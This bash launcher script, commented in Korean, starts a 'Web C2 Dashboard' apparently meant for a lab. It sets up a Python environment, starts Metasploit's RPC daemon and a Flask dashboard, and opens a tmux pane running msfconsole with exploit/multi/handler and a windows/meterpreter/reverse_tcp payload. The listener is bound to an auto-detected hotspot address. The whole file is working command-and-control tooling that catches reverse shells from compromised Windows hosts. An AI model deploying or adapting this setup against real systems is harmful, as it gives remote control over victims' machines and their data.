#!/bin/bash
set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
VENV="$SCRIPT_DIR/.venv"
SESSION="c2lab"
MSF_PASSWORD="${MSF_PASSWORD:-msfrpc}"
LPORT="${LPORT:-4444}"

# LHOST: 환경변수 > 자동 감지 (핫스팟 브릿지 인터페이스 기준)
if [ -z "$LHOST" ]; then
    LHOST=$(ip route get 10.254.254.254 2>/dev/null \
        | awk '{for(i=1;i<=NF;i++) if($i=="src") print $(i+1); exit}')
    # 위 방법 실패 시 첫 번째 비루프백 IP
    [ -z "$LHOST" ] && LHOST=$(hostname -I | awk '{print $1}')
fi

R='\033[0;31m'; G='\033[0;32m'; C='\033[0;36m'; Y='\033[1;33m'; N='\033[0m'

echo -e "${C}"
echo "  ╔══════════════════════════════════════╗"
echo "  ║          Web C2 Dashboard            ║"
echo "  ╠══════════════════════════════════════╣"
echo -e "  ║  LHOST  ${Y}$LHOST${C}"
echo -e "  ║  LPORT  ${Y}$LPORT${C}"
echo -e "  ║  DASH   ${Y}http://$LHOST:5000${C}"
echo "  ╚══════════════════════════════════════╝"
echo -e "${N}"

# ── tmux 확인 ─────────────────────────────────────────────────────────────────
if ! command -v tmux &>/dev/null; then
    echo -e "${Y}[*] tmux 설치 중...${N}"
    apt-get install -y tmux -q
fi

# ── 가상환경 생성 (최초 1회) ──────────────────────────────────────────────────
echo -e "${G}[1/3] 가상환경 준비...${N}"
if [ ! -d "$VENV" ]; then
    python3 -m venv "$VENV"
    echo -e "      ${Y}가상환경 생성됨: $VENV${N}"
else
    echo -e "      기존 가상환경 재사용"
fi

# ── 의존성 설치 ───────────────────────────────────────────────────────────────
echo -e "${G}[2/3] 의존성 설치...${N}"
"$VENV/bin/pip" install -q -r "$SCRIPT_DIR/backend/requirements.txt"

# ── 기존 프로세스 정리 ────────────────────────────────────────────────────────
echo -e "${G}[3/3] 기존 프로세스 정리 및 서비스 시작...${N}"
pkill -f msfrpcd              2>/dev/null || true
pkill -f "python.*app\.py"    2>/dev/null || true
fuser -k -n tcp 55553         2>/dev/null || true
fuser -k -n tcp 5000          2>/dev/null || true
sleep 1

# ── msfrpcd 시작 ──────────────────────────────────────────────────────────────
msfrpcd -P "$MSF_PASSWORD" -n -f -a 127.0.0.1 -p 55553 \
    >"$SCRIPT_DIR/msfrpcd.log" 2>&1 &
echo -e "      msfrpcd 시작됨 (5초 대기)..."
sleep 5

# ── tmux 세션 구성 ────────────────────────────────────────────────────────────
tmux kill-session -t "$SESSION" 2>/dev/null || true
tmux new-session -d -s "$SESSION" -x 220 -y 50

# 상단 (65%) — Flask 대시보드
tmux send-keys -t "$SESSION:0.0" \
    "cd '$SCRIPT_DIR/backend' && \
     MSF_PASSWORD='$MSF_PASSWORD' LHOST='$LHOST' LPORT='$LPORT' \
     '$VENV/bin/python' app.py" Enter

# 하단 (35%) — msfconsole 리스너
tmux split-window -t "$SESSION:0" -v -p 35
tmux send-keys -t "$SESSION:0.1" \
    "sleep 3 && msfconsole -q -x \
     \"use exploit/multi/handler; \
       set payload windows/meterpreter/reverse_tcp; \
       set LHOST $LHOST; \
       set LPORT $LPORT; \
       exploit;\"" Enter

tmux select-pane -t "$SESSION:0.0"

echo -e "\n${G}[+] 완료${N}"
echo -e "    대시보드 : ${Y}http://$LHOST:5000${N}"
echo -e "    세션 분리 : ${Y}Ctrl+B  D${N}"
echo -e "    패널 이동 : ${Y}Ctrl+B  방향키${N}\n"

tmux attach-session -t "$SESSION"
